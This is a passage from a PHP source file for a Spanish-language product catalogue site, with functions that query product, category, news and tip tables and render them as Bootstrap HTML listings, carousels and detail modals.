}

function publico_catalogo_productos_categoria_tab(){
    
    $arrProductos = array();
    
    $strQuery = "SELECT catalogo_categoria.catalogo_categoria,
                        catalogo_categoria.nombre
                 FROM   catalogo_categoria
                 WHERE  catalogo_categoria.activo = 'Y'
                 AND    catalogo_categoria.catalogo_categoria_padre IS NULL";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $strQuery = "SELECT catalogo.catalogo,
                            catalogo.codigo,
                            catalogo.nombre,
                            catalogo.descripcion,
                            catalogo.precio,
                            catalogo.precio_oferta,
                            catalogo.en_oferta,
                            catalogo.nuevo,
                            catalogo.imagen
                     FROM   catalogo
                     WHERE  catalogo.activo = 'Y' 
                     AND    catalogo.catalogo_categoria = {$rTMP["catalogo_categoria"]}";
        $qTMP1 = db_consulta($strQuery);
        while( $rTMP1 = db_fetch_assoc($qTMP1) ) {
            $arrProductos[$rTMP["catalogo_categoria"]]["nombre"] = $rTMP["nombre"];
            $arrProductos[$rTMP["catalogo_categoria"]]["productos"][$rTMP1["catalogo"]]["codigo"] = $rTMP1["codigo"];
            $arrProductos[$rTMP["catalogo_categoria"]]["productos"][$rTMP1["catalogo"]]["nombre"] = $rTMP1["nombre"];
            $arrProductos[$rTMP["catalogo_categoria"]]["productos"][$rTMP1["catalogo"]]["descripcion"] = $rTMP1["descripcion"];
            $arrProductos[$rTMP["catalogo_categoria"]]["productos"][$rTMP1["catalogo"]]["precio"] = $rTMP1["precio"];
            $arrProductos[$rTMP["catalogo_categoria"]]["productos"][$rTMP1["catalogo"]]["precio_oferta"] = $rTMP1["precio_oferta"];
            $arrProductos[$rTMP["catalogo_categoria"]]["productos"][$rTMP1["catalogo"]]["en_oferta"] = $rTMP1["en_oferta"];
            $arrProductos[$rTMP["catalogo_categoria"]]["productos"][$rTMP1["catalogo"]]["nuevo"] = $rTMP1["nuevo"];
            $arrProductos[$rTMP["catalogo_categoria"]]["productos"][$rTMP1["catalogo"]]["imagen"] = "la-admin/".$rTMP1["imagen"];
        }
        db_free_result($qTMP1);
    }
    db_free_result($qTMP);
    
    if( count($arrProductos) > 0 ) {
        ?>
        
        <section class="portfolio_area">
        <div class="container">
            <div class="portfolio_filter">
                <ul>
                    <li class="active" data-filter="*"><a href="#">Todo</a></li>
                    <?php
                    $strClass = "active";
                    while( $arrC = each($arrProductos) ) {
                        ?>
                        <li data-filter=".c_<?php print $arrC["key"]; ?>"><a href="#"><?php print $arrC["value"]["nombre"]; ?></a></li>
                        <?php
                        $strClass = "";
                    }
                    ?>
                </ul>
            </div>
        </div>
        
        <?php
        $strClass = "active in";
        reset($arrProductos);
        while( $arrC = each($arrProductos) ) {
            ?>
        
            <div class="ms_portfolio_inner">
                
                <?php
                $i = 1;
                $cuantos = count($arrC["value"]["productos"]);
                while($arrP = each($arrC["value"]["productos"]) ) {
                    
                    if( $i == 1 ) {
                        ?>
                        <div class="row">
                        <?php
                    }                        
                    ?>
            
                    <div class="col-md-3 col-sm-12 ms_p_item brand arc c_<?php print $arrC["key"]; ?>">
                        <img src="../<?php print $arrP["value"]["imagen"]; ?>" alt="" />
                        <div class="center_c">
                            <h3><?php print $arrP["value"]["nombre"]; ?></h3>
                            <!--<p>Description of panel</p>--><br>
                            <button type="button" class="btn btn-success details" data-toggle="modal" data-target="#Producto_<?php print $arrP["key"]; ?>">Ver Detalles</button>
                            <br><br>
                        </div>
                    </div>
                    <div class="modal fade" id="Producto_<?php print $arrP["key"]; ?>" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered" role="document">
                            <div class="modal-content">
                                <div class="modal-header">
                                    <h5 class="modal-title" id="firstPanelTitle"><?php print $arrP["value"]["nombre"]; ?></h5>
                                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                        <span aria-hidden="true">&times;</span>
                                    </button>
                                </div>
                                <div class="modal-body">
                                    <img class="d-block w-100" src="../<?php print $arrP["value"]["imagen"]; ?>" alt="First slide">
                                    <div class="row">
                                        <div class="col-md-8">
                                            <p><?php print $arrP["value"]["descripcion"]; ?></p>
                                        </div>
                                        <div class="col-md-4">
                                            <img src="../<?php print $arrP["value"]["imagen"]; ?>" class="cardLogo" alt="">
                                        </div>
                                    </div>
                                </div>
                                <div class="modal-footer">
                                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Cerrar</button>
                                    <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#checkPrice">Cotizar</button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <?php
                    $cuantos--;
                    if( $i == 4 || $cuantos == 0 ) {
                        ?>
                        </div>
                        <?php
                        $i = 0;
                    }
                    $i++;
                }
                ?>       
            
            </div>
            
            <?php
        }
        ?>
   
        <?php
    }    
}

function publico_catalogo_productos_recomendados_carousel(){
    
    $arrProductos = array();
    $intIndex = 0;
    $intCorrelativo = 0;
    $strQuery = "SELECT catalogo.catalogo,
                        catalogo.codigo,
                        catalogo.nombre,
                        catalogo.precio,
                        catalogo.precio_oferta,
                        catalogo.en_oferta,
                        catalogo.nuevo,
                        catalogo.imagen
                 FROM   catalogo
                 WHERE  catalogo.activo = 'Y'
                 AND    catalogo.recomendar = 'Y'
                 LIMIT  100";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $intCorrelativo++;
        $arrProductos[$intIndex]["productos"][$rTMP["catalogo"]]["codigo"] = $rTMP["codigo"];
        $arrProductos[$intIndex]["productos"][$rTMP["catalogo"]]["nombre"] = $rTMP["nombre"];
        $arrProductos[$intIndex]["productos"][$rTMP["catalogo"]]["precio"] = $rTMP["precio"];
        $arrProductos[$intIndex]["productos"][$rTMP["catalogo"]]["precio_oferta"] = $rTMP["precio_oferta"];
        $arrProductos[$intIndex]["productos"][$rTMP["catalogo"]]["en_oferta"] = $rTMP["en_oferta"];
        $arrProductos[$intIndex]["productos"][$rTMP["catalogo"]]["nuevo"] = $rTMP["nuevo"];
        $arrProductos[$intIndex]["productos"][$rTMP["catalogo"]]["imagen"] = "la-admin/".$rTMP["imagen"];
        if( $intCorrelativo == 3 ) {
            $intCorrelativo = 0;
            $intIndex++;
        }
    }
    db_free_result($qTMP);
    if( count($arrProductos) > 0 ) {
        ?>
        <div class="recommended_items">
            <h2 class="title text-center">Productos Recomendados</h2>
            <div id="recommended-item-carousel" class="carousel slide" data-ride="carousel">
                <div class="carousel-inner">
                    <?php
                    $strClass = "active";
                    while( $arrI = each($arrProductos) ) {
                        ?>
                        <div class="item <?php print $strClass; ?>">
                            <?php
                            while( $arrP = each($arrI["value"]["productos"]) ) {
                                ?>
                                <div class="col-sm-4">
                                    <div class="product-image-wrapper">
                                        <div class="single-products">
                                            <div class="productinfo text-center">
                                                <img src="<?php print $arrP["value"]["imagen"]; ?>" alt="" />
                                                <h2>Q <?php print ($arrP["value"]["en_oferta"] == "Y") ? number_format($arrP["value"]["precio_oferta"],2) : number_format($arrP["value"]["precio"],2); ?></h2>
                                                <p><?php print $arrP["value"]["nombre"]; ?></p>
                                                <a href="catalogo_producto.php?id=<?php print $arrP["key"]; ?>" class="btn btn-default add-to-cart"><i class="fa fa-shopping-cart"></i>Ver producto</a>
                                            </div>
                                            <?php
                                            if( $arrP["value"]["en_oferta"] == "Y" ) {
                                                ?>
                                                <img src="images/home/sale.png" class="new" alt="" />
                                                <?php
                                            }
                                            elseif( $arrP["value"]["nuevo"] == "Y" ) {
                                                ?>
                                                <img src="images/home/new.png" class="new" alt="" />
                                                <?php
                                            }
                                            ?>
                                        </div>
                                    </div>
                                </div>
                                <?php
                            }
                            ?>
                        </div>
                        <?php
                        $strClass = "";
                    }
                    ?>
                </div>
                <a class="left recommended-item-control" href="#recommended-item-carousel" data-slide="prev">
                    <i class="fa fa-angle-left"></i>
                </a>
                <a class="right recommended-item-control" href="#recommended-item-carousel" data-slide="next">
                    <i class="fa fa-angle-right"></i>
                </a>            
            </div>
        </div>
        <?php
    }    
}

function publico_catalogo_productos(){
    
    $intCategoria = isset($_REQUEST["c"]) ? intval($_REQUEST["c"]) : 0;
    $intSubCategoria = isset($_REQUEST["sc"]) ? intval($_REQUEST["sc"]) : 0;
    $intMarca = isset($_REQUEST["m"]) ? intval($_REQUEST["m"]) : 0;
    
    if( $intCategoria > 0 ) {
        $strWhere = " AND catalogo.catalogo_categoria = {$intCategoria}";
    }
    elseif( $intSubCategoria > 0 ) {
        $strWhere = " AND catalogo.catalogo_sub_categoria = {$intSubCategoria}";
    }
    elseif( $intMarca > 0 ) {
        $strWhere = " AND catalogo.catalogo_marca = {$intMarca}";
    }
    else {
        $strWhere = "";
    }
    
    $arrProductos = array();
    $strQuery = "SELECT catalogo.catalogo,
                        catalogo.codigo,
                        catalogo.nombre,
                        catalogo.precio,
                        catalogo.precio_oferta,
                        catalogo.en_oferta,
                        catalogo.nuevo,
                        catalogo.imagen
                 FROM   catalogo
                 WHERE  catalogo.activo = 'Y'
                        {$strWhere}
                 LIMIT  1000";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $arrProductos[$rTMP["catalogo"]]["codigo"] = $rTMP["codigo"];
        $arrProductos[$rTMP["catalogo"]]["nombre"] = $rTMP["nombre"];
        $arrProductos[$rTMP["catalogo"]]["precio"] = $rTMP["precio"];
        $arrProductos[$rTMP["catalogo"]]["precio_oferta"] = $rTMP["precio_oferta"];
        $arrProductos[$rTMP["catalogo"]]["en_oferta"] = $rTMP["en_oferta"];
        $arrProductos[$rTMP["catalogo"]]["nuevo"] = $rTMP["nuevo"];
        $arrProductos[$rTMP["catalogo"]]["imagen"] = "la-admin/".$rTMP["imagen"];
    }
    db_free_result($qTMP);
    
    if( count($arrProductos) > 0 ) {
        ?>
        <div class="features_items">
            <h2 class="title text-center">Productos</h2>
            <?php
            reset($arrProductos);
            while( $arrP = each($arrProductos) ) {
                ?>
                <div class="col-sm-4">
                    <div class="product-image-wrapper">
                        <div class="single-products">
                            <div class="productinfo text-center">
                                <img src="<?php print $arrP["value"]["imagen"]; ?>" alt="" />
                                <h2>Q <?php print ($arrP["value"]["en_oferta"] == "Y") ? number_format($arrP["value"]["precio_oferta"],2) : number_format($arrP["value"]["precio"],2); ?></h2>
                                <p><?php print $arrP["value"]["nombre"]; ?></p>
                                <a href="catalogo_producto.php?id=<?php print $arrP["key"]; ?>" class="btn btn-default add-to-cart"><i class="fa fa-shopping-cart"></i>Ver producto</a>
                            </div>
                            <div class="product-overlay">
                                <div class="overlay-content">
                                    <h2>Q <?php print ($arrP["value"]["en_oferta"] == "Y") ? number_format($arrP["value"]["precio_oferta"],2) : number_format($arrP["value"]["precio"],2); ?></h2>
                                    <p><?php print $arrP["value"]["nombre"]; ?></p>
                                    <a href="catalogo_producto.php?id=<?php print $arrP["key"]; ?>" class="btn btn-default add-to-cart"><i class="fa fa-shopping-cart"></i>Ver producto</a>
                                </div>
                            </div>
                            <?php
                            if( $arrP["value"]["en_oferta"] == "Y" ) {
                                ?>
                                <img src="images/home/sale.png" class="new" alt="" />
                                <?php
                            }
                            elseif( $arrP["value"]["nuevo"] == "Y" ) {
                                ?>
                                <img src="images/home/new.png" class="new" alt="" />
                                <?php
                            }
                            ?>
                        </div>
                    </div>
                </div>
                
                <?php
            }
            ?>
        </div>    
        <?php
    }
}

function publico_catalogo_producto(){
    
    $intId = isset($_REQUEST["id"]) ? intval($_REQUEST["id"]) : 0;
    $arrProductos = array();
    $strQuery = "SELECT catalogo.catalogo,
                        catalogo.codigo,
                        catalogo.nombre,
                        catalogo.precio,
                        catalogo.precio_oferta,
                        catalogo.en_oferta,
                        catalogo.nuevo,
                        catalogo.descripcion,
                        catalogo.especificacion,
                        catalogo.imagen,
                        catalogo_marca.nombre nombre_marca,
                        catalogo_categoria.nombre nombre_categoria,
                        catalogo_sub_categoria.nombre nombre_sub_categoria
                 FROM   catalogo
                        INNER JOIN catalogo_marca
                            ON catalogo_marca.catalogo_marca = catalogo.catalogo_marca
                        LEFT JOIN catalogo_categoria
                            ON catalogo.catalogo_categoria = catalogo_categoria.catalogo_categoria
                        LEFT JOIN catalogo_categoria catalogo_sub_categoria
                            ON catalogo.catalogo_sub_categoria = catalogo_sub_categoria.catalogo_categoria
                 WHERE  catalogo.activo = 'Y'
                 AND    catalogo.catalogo = {$intId}
                 LIMIT  1";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $arrProductos[$rTMP["catalogo"]]["codigo"] = $rTMP["codigo"];
        $arrProductos[$rTMP["catalogo"]]["nombre"] = $rTMP["nombre"];
        $arrProductos[$rTMP["catalogo"]]["precio"] = $rTMP["precio"];
        $arrProductos[$rTMP["catalogo"]]["precio_oferta"] = $rTMP["precio_oferta"];
        $arrProductos[$rTMP["catalogo"]]["en_oferta"] = $rTMP["en_oferta"];
        $arrProductos[$rTMP["catalogo"]]["nuevo"] = $rTMP["nuevo"];
        $arrProductos[$rTMP["catalogo"]]["descripcion"] = $rTMP["descripcion"];
        $arrProductos[$rTMP["catalogo"]]["especificacion"] = $rTMP["especificacion"];
        $arrProductos[$rTMP["catalogo"]]["imagen"] = "la-admin/".$rTMP["imagen"];
        $arrProductos[$rTMP["catalogo"]]["nombre_marca"] = $rTMP["nombre_marca"];
        $arrProductos[$rTMP["catalogo"]]["nombre_catagoria"] = $rTMP["nombre_categoria"];
        $arrProductos[$rTMP["catalogo"]]["nombre_sub_categoria"] = $rTMP["nombre_sub_categoria"];
    }
    db_free_result($qTMP);
    
    $intIndex = 0;
    $intCorrelativo = 0;    
    $arrImagenes = array();
    $strQuery = "SELECT catalogo_imagen.catalogo_imagen,
                        catalogo_imagen.imagen
                 FROM   catalogo_imagen
                 WHERE  catalogo_imagen.catalogo = {$intId}";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $intCorrelativo++;
        $arrImagenes[$intIndex][$rTMP["catalogo_imagen"]] = $rTMP["imagen"];
        if( $intCorrelativo == 3 ) {
            $intCorrelativo = 0;
            $intIndex++;
        }
    }
    db_free_result($qTMP);
    
    $arrCaracteristicas = array();
    $strQuery = "SELECT catalogo_caracteristica.catalogo_caracteristica,
                        catalogo_caracteristica.nombre,
                        catalogo_c.catalogo_c,
                        catalogo_c.valor
                 FROM   catalogo_c
                        INNER JOIN catalogo_caracteristica
                            ON catalogo_c.catalogo_caracteristica = catalogo_caracteristica.catalogo_caracteristica
                 WHERE  catalogo_c.catalogo = {$intId}";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $arrCaracteristicas[$rTMP["catalogo_caracteristica"]]["nombre"] = $rTMP["nombre"];
        $arrCaracteristicas[$rTMP["catalogo_caracteristica"]]["valores"][$rTMP["catalogo_c"]] = $rTMP["valor"];
    }
    db_free_result($qTMP);
    /*print "<pre>";
    print_r($arrCaracteristicas);
    print "</pre>";*/
    if( count($arrProductos) > 0 ) {
        reset($arrProductos);
        while( $arrP = each($arrProductos) ) {
            ?>
            <div class="product-details">
                <div class="col-sm-5">
                    <div class="view-product">
                        <img src="<?php print $arrP["value"]["imagen"]; ?>" alt="" />
                        <h3>ZOOM</h3>
                    </div>
                    <div id="similar-product" class="carousel slide" data-ride="carousel">
                        <div class="carousel-inner">
                            <?php
                            $strClass = "active";
                            while( $arrC = each($arrImagenes) ) {
                                ?>
                                <div class="item <?php print $strClass; ?>">
                                    <?php
                                    while( $arrI = each($arrC["value"]) ) {
                                        ?>
                                        <a href=""><img src="<?php print "la-admin/".$arrI["value"]; ?>" style="width: 85px; height: 84px;" alt=""></a>
                                        <?php
                                    }
                                    ?>
                                </div>
                                <?php
                                $strClass = "";
                            }
                            ?>
                        </div>
                        <a class="left item-control" href="#similar-product" data-slide="prev">
                            <i class="fa fa-angle-left"></i>
                        </a>
                        <a class="right item-control" href="#similar-product" data-slide="next">
                            <i class="fa fa-angle-right"></i>
                        </a>
                    </div>
                </div>
                <div class="col-sm-7">
                    <div class="product-information">
                        <?php
                        if( $arrP["value"]["en_oferta"] == "Y" ) {
                            ?>
                            <img src="images/product-details/sale.jpg" class="newarrival" alt="" />
                            <?php
                        }
                        elseif( $arrP["value"]["nuevo"] == "Y" ) {
                            ?>
                            <img src="images/product-details/new.jpg" class="newarrival" alt="" />
                            <?php
                        }
                        ?>
                        <h2><?php print $arrP["value"]["nombre"]; ?></h2>
                        <h5>Código:&nbsp;<?php print $arrP["value"]["codigo"]; ?></h5>
                        <h5>Precio: <?php print ($arrP["value"]["en_oferta"] == "Y") ? "<small><s>Q&nbsp;".number_format($arrP["value"]["precio_oferta"],2)."</s></small>&nbsp;Q&nbsp;".number_format($arrP["value"]["precio"],2)."" : "Q&nbsp;".number_format($arrP["value"]["precio"],2); ?></h5>
                        <h5>En oferta:&nbsp;<?php print ($arrP["value"]["en_oferta"] == "Y") ? "Si" : "No"; ?></h5>
                        <h5>Marca:&nbsp;<?php print $arrP["value"]["nombre_marca"]; ?></h5>
                        <?php
                        if( !empty($arrP["value"]["nombre_catagoria"])) {
                            ?>
                            <h5>Categoría:&nbsp;<?php print $arrP["value"]["nombre_catagoria"]; ?></h5>
                            <?php
                        }
                        if( !empty($arrP["value"]["nombre_sub_categoria"])) {
                            ?>
                            <h5>Sub-categoría:&nbsp;<?php print $arrP["value"]["nombre_sub_categoria"]; ?></h5>
                            <?php
                        }    
                        ?>
                    </div>
                </div>
            </div>
            
            <div class="category-tab shop-details-tab">
                <div class="col-sm-12">
                    <ul class="nav nav-tabs">
                        <li class="active"><a href="#aDescripcion" data-toggle="tab">Descripción</a></li>
                        <li><a href="#aCaracteristicas" data-toggle="tab">Característica</a></li>
                        <li><a href="#aEspecificaciones" data-toggle="tab">Especificaciones</a></li>
                    </ul>
                </div>
                <div class="tab-content">
                    <div class="tab-pane fade active in" id="aDescripcion" >
                        <div class="col-sm-12">
                            <p><?php print $arrP["value"]["descripcion"]; ?></p>
                        </div>
                    </div>
                    
                    <div class="tab-pane fade" id="aCaracteristicas" >
                        <div class="col-sm-12">
                                <?php
                                while( $arrC = each($arrCaracteristicas) ) {
                                    ?>
                                    <h4><?php print $arrC["value"]["nombre"]." : <small>".implode(",",$arrC["value"]["valores"])."</small>"; ?></h4>
                                    <?php
                                }
                                ?>
                        </div>
                    </div>
                    
                    <div class="tab-pane fade" id="aEspecificaciones" >
                        <div class="col-sm-12">
                            <p><?php print $arrP["value"]["especificacion"]; ?></p>
                        </div>
                    </div>
                </div>
            </div>
            <?php
        }
    }
}

function publico_catalogo(){
    
    $arrCategorias = array();
    $arrProductos = array();
    
    $strQuery = "SELECT catalogo.catalogo,
                        catalogo.codigo,
                        catalogo.nombre,
                        catalogo.catalogo_categoria categoria,
                        catalogo.imagen,
                        catalogo_categoria.nombre nombreCategoria
                 FROM   catalogo
                        INNER JOIN catalogo_categoria
                            ON  catalogo_categoria.catalogo_categoria = catalogo.catalogo_categoria
                 WHERE  catalogo.activo = 'Y'";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $arrCategorias[$rTMP["categoria"]] = $rTMP["nombreCategoria"];
        $arrProductos[$rTMP["catalogo"]]["categoria"] = $rTMP["categoria"];
        $arrProductos[$rTMP["catalogo"]]["codigo"] = $rTMP["codigo"];
        $arrProductos[$rTMP["catalogo"]]["nombre"] = $rTMP["nombre"];
        $arrProductos[$rTMP["catalogo"]]["imagen"] = "la-admin/".$rTMP["imagen"];
    }
    db_free_result($qTMP);
    ?>
    <ul class="portfolio-filter">
        <li><a class="btn btn-primary active" href="#" data-filter="*">Todos</a></li>
        <?php
        reset($arrCategorias);
        while( $arrC = each($arrCategorias) ) {
            ?>
            <li><a class="btn btn-primary" href="#" data-filter=".categoria_<?php print $arrC["key"]; ?>"><?php print $arrC["value"]; ?></a></li>
            <?php
        }
        ?>
    </ul>
    
    <ul class="portfolio-items col-4">
        <?php
        reset($arrProductos);
        while( $arrP = each($arrProductos) ) {
            ?>
            <li class="portfolio-item categoria_<?php print $arrP["value"]["categoria"]; ?>">
                <div class="item-inner">
                    <div class="portfolio-image">
                        <img src="<?php print $arrP["value"]["imagen"]; ?>" alt="">
                        <div class="overlay">
                            <a class="preview btn btn-danger" title="" href="<?php print $arrP["value"]["imagen"]; ?>"><i class="icon-eye-open"></i></a>
                        </div>
                    </div>
                    <h5><strong>Código&nbsp;<?php print $arrP["value"]["codigo"]; ?></strong></h5>
                </div>
            </li>
            <?php
        }
        ?>
    </ul>    
    <?php    
}

function publico_noticias() {
    $intCategoria = isset($_GET["categoria"]) ? intval($_GET["categoria"]) : 0;
    $strWhere = $intCategoria > 0 ? " AND noticia.noticia_categoria = {$intCategoria}" : "";
    $strPathImagenes = "la-admin/";
    $strImagen = "";
    $arrNoticias = array();
    $strQuery = "SELECT noticia.noticia,
                        noticia.titulo,
                        noticia.introduccion,
                        noticia.contenido,
                        noticia.imagen,
                        IF(noticia.mod_fecha IS NULL, noticia.add_fecha, noticia.mod_fecha) AS fecha,
                        DATE_FORMAT(IF(noticia.mod_fecha IS NULL, noticia.add_fecha, noticia.mod_fecha), '%d-%b-%Y %H:%i') AS fecha_hora,
                        noticia_categoria.nombre categoriaNombre                    
                 FROM   noticia
                        LEFT JOIN noticia_categoria
                            ON  noticia_categoria.noticia_categoria = noticia.noticia_categoria
                 WHERE  noticia.activo = 'Y'
                        {$strWhere}
                 ORDER  BY fecha DESC";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $arrNoticias[$rTMP["noticia"]] = $rTMP;
    }
    db_free_result($qTMP);
    ?>
    <div class="blog-post-area">
        <h2 class="title text-center">Ultimas Noticias</h2>
        <?php
        reset($arrNoticias);
        while( $arrN = each($arrNoticias) ) {
            $strImagen = empty($arrN["value"]["imagen"]) ? "" : '<img src="'.$strPathImagenes.$arrN["value"]["imagen"].'" style="width:862px;height:398px" alt="" class="img-responsive">';
            ?>
            <div class="single-blog-post">
                <h3><?php print $arrN["value"]["titulo"]; ?></h3>
                <div class="post-meta">
                    <ul>
                        <li><i class="fa fa-calendar"></i> <?php print $arrN["value"]["fecha_hora"]; ?></li>
                    </ul>
                </div>
                <a href="">
                    <?php print $strImagen; ?>
                </a>
                <p><?php print $arrN["value"]["introduccion"]; ?></p>
                <a class="btn btn-primary" href="noticia_articulo.php?id=<?php print $arrN["value"]["noticia"]; ?>">Leer más ...</a>
            </div>
            <?php
        }
        ?>
    </div>
    <div class="row"><div class="col-sm-12">&nbsp;</div></div>
    <?php    
}

function publico_noticia() {
    $intNoticia = isset($_GET["id"]) ? intval($_GET["id"]) : 0;
    $strPathImagenes = "la-admin/";
    $arrNoticia = array();
    $strQuery = "SELECT noticia.noticia,
                        noticia.titulo,
                        noticia.introduccion,
                        noticia.contenido,
                        noticia.imagen,
                        DATE_FORMAT(IF(noticia.mod_fecha IS NULL, noticia.add_fecha, noticia.mod_fecha), '%d-%b-%Y %H:%i') AS fecha_hora,
                        noticia_imagen.noticia_imagen,
                        noticia_imagen.imagen imagenes
                 FROM   noticia
                        LEFT JOIN noticia_imagen
                            ON  noticia_imagen.noticia = noticia.noticia
                 WHERE  noticia.activo = 'Y'
                 AND    noticia.noticia = {$intNoticia}";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $arrNoticias[$rTMP["noticia"]] = $rTMP;
    }
    db_free_result($qTMP);
    $strImagen = empty($arrN["value"]["imagen"]) ? "" : '<img src="'.$strPathImagenes.$arrN["value"]["imagen"].'" style="width:862px;height:398px" alt="" class="img-responsive">';
    ?>
    <div class="blog-post-area">
        <h2 class="title text-center">Noticia</h2>
        <?php
        reset($arrNoticias);
        while( $arrN = each($arrNoticias) ) {
            $strImagen = empty($arrN["value"]["imagen"]) ? "" : '<img src="'.$strPathImagenes.$arrN["value"]["imagen"].'" style="width:862px;height:398px" alt="" class="img-responsive">';
            ?>
            <div class="single-blog-post">
                <h3><?php print $arrN["value"]["titulo"]; ?></h3>
                <div class="post-meta">
                    <ul>
                        <li><i class="fa fa-calendar"></i> <?php print $arrN["value"]["fecha_hora"]; ?></li>
                    </ul>
                </div>
                <a href="">
                    <?php print $strImagen; ?>
                </a>
                <p><?php print $arrN["value"]["contenido"]; ?></p>
            </div>
            <?php
        }
        ?>
    </div>
    <?php
}

function publico_tips() {
    
    $arrTips = array();
    $intCorrelativo = 1;
    $intContador = 0;
    $strQuery = "SELECT tips,
                        descripcion,
                        imagen
                 FROM   tips
                 WHERE  activo = 'Y'";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $intContador++;
        $arrTips[$intCorrelativo][$rTMP["tips"]]["descripcion"] = $rTMP["descripcion"];
        $arrTips[$intCorrelativo][$rTMP["tips"]]["imagen"] = "la-admin/".$rTMP["imagen"];
        if( $intContador == 4 ){
            $intContador = 0;
            $intCorrelativo++;
        }
    }
    db_free_result($qTMP);
    ?>
    <div id="team-scroller" class="carousel scale">
        <div class="carousel-inner">
            <?php
            $strActive = 'active';
            reset($arrTips);
            while( $arrT = each($arrTips) ) {
                ?>
                <div class="item <?php print $strActive; ?>">
                    <div class="row">
                        <?php
                        while( $arrL = each($arrT["value"]) ) {
                            ?>
                            <div class="col-sm-3">
                                <div class="member">
                                    <p><img class="img-responsive img-thumbnail img-circle" src="<?php print $arrL["value"]["imagen"]; ?>" alt="" ></p>
                                    <h3><small class="designation"><?php print $arrL["value"]["descripcion"]; ?></small></h3>
                                </div>
                            </div>
                            <?php
                        }
                        ?>
                    </div>
                </div>
                <?php
                $strActive = '';
            }
            ?>
        </div>
        <a class="left-arrow" href="#team-scroller" data-slide="prev">
            <i class="icon-angle-left icon-4x"></i>
        </a>
        <a class="right-arrow" href="#team-scroller" data-slide="next">
            <i class="icon-angle-right icon-4x"></i>
        </a>
    </div><!--/.carousel-->
    <?php   
    
    
}